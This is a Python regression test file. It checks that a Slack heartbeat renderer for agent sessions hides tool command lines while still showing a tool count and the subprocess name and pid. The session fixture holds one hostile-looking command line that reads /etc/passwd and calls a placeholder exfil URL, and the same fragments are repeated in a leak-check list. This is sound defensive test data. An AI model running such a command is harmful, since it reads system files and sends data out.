"""Regression tests for the tool-call hide policy in heartbeat.py.

User requirement: the Slack heartbeat must never surface a tool
invocation's argument string (Bash command line, Edit args, file paths,
…). We're allowed to show a *count* of tool calls — but not the
individual snippets that would leak file contents or paths.

These tests pin both render functions (`_line` for plaintext, the
Block Kit equivalent `_section_text_for` for mrkdwn) against a session
dict carrying a deliberately leaky cmdline and tool_recent payload. If
a future edit re-introduces the snippet rendering, these tests fail
before Slack does.
"""
from __future__ import annotations

import datetime as _dt
import re

from worker_control_hermes import heartbeat


def _fake_session(*, msg_tool: int = 4) -> dict:
    """A session dict in the shape `_load_db_sessions` returns.

    Every field heartbeat reads is set explicitly so the test doesn't
    accidentally pass because a renderer skipped over a missing key.
    """
    return {
        "id": 1, "uuid": "11111111-2222-3333-4444-555555555555",
        "name": "a-ok:test-session",
        "origin": "spawned", "status": "active",
        "display_status": "active",
        "brief": "doing CI work",
        "model": "claude-sonnet-4-5",
        "last_used_at": "2026-05-18T11:55:00Z",
        "ended_at": None, "created_at": "2026-05-18T10:00:00Z",
        "claude_name": None, "claude_status": "busy", "claude_status_at": None,
        "proj_name": "a-ok", "proj_path": "D:/work-github/a-ok",
        "msg_tool": msg_tool,
        "runs": [{
            "id": 7, "run_index": 1, "mode": "print", "status": "running",
            "started_at": "2026-05-18T11:55:00Z", "ended_at": None,
            "name": "a-ok:test-run",
        }],
        # Fields heartbeat injects in classify_sessions() — we set them
        # here so the render functions take the populated branches.
        "_last": _dt.datetime(2026, 5, 18, 11, 55, 0, tzinfo=_dt.timezone.utc),
        "_subagents": 0, "_subagents_active": 0,
        "_subprocs_alive": [{
            # The cmdline is the canonical leak: a tool invocation that
            # used to be rendered inline. The renderer must NOT include
            # it in either output.
            "name": "bash.exe", "pid": 4242,
            "cmdline": "bash -c 'cat /etc/passwd && curl https://example.com/exfil'",
            "started_at": "2026-05-18T11:50:00Z",
            "kind": "shell",
        }],
        "_subprocs_just_ended": [],
        "_claude_status": "busy", "_claude_name": None,
        "_active_tasks": [],
        "_summary": "doing CI work",
        "_current_prompt": "",
        "_pending": False,
    }


_LEAK_FRAGMENTS = (
    "cat /etc/passwd",
    "curl https://example.com/exfil",
    "bash -c",
)


def test_line_does_not_render_cmdline_snippet() -> None:
    s = _fake_session()
    line = heartbeat._line(s)
    for frag in _LEAK_FRAGMENTS:
        assert frag not in line, (
            f"plaintext _line() leaked tool snippet {frag!r}: {line!r}"
        )
    # But the *count* IS allowed — the user asked for a compact tools×N.
    assert re.search(r"tools.?×.?\d+", line), (
        f"expected a 'tools×N' counter in plaintext output: {line!r}"
    )


def test_section_text_does_not_render_cmdline_snippet() -> None:
    s = _fake_session()
    text = heartbeat._section_text_for(s, "alive")
    for frag in _LEAK_FRAGMENTS:
        assert frag not in text, (
            f"_section_text_for leaked tool snippet {frag!r}: {text!r}"
        )
    assert re.search(r"tools.?×.?\d+", text), (
        f"expected a 'tools×N' chip in slack output: {text!r}"
    )


def test_subproc_name_and_pid_still_visible() -> None:
    # Hiding the cmdline shouldn't hide the existence of the workload —
    # users still need to know "the shell subprocess is alive". So
    # bash.exe / pid 4242 must still appear; just no argv.
    s = _fake_session()
    line = heartbeat._line(s)
    text = heartbeat._section_text_for(s, "alive")
    for out in (line, text):
        assert "bash.exe" in out, f"name dropped from output: {out!r}"
        assert "4242" in out, f"pid dropped from output: {out!r}"


def test_zero_tools_means_no_counter() -> None:
    # If the session hasn't invoked any tools, the tools×N chip should
    # be omitted entirely — emitting "tools×0" would just be noise.
    s = _fake_session(msg_tool=0)
    line = heartbeat._line(s)
    text = heartbeat._section_text_for(s, "alive")
    assert "tools×" not in line and "tools×" not in text
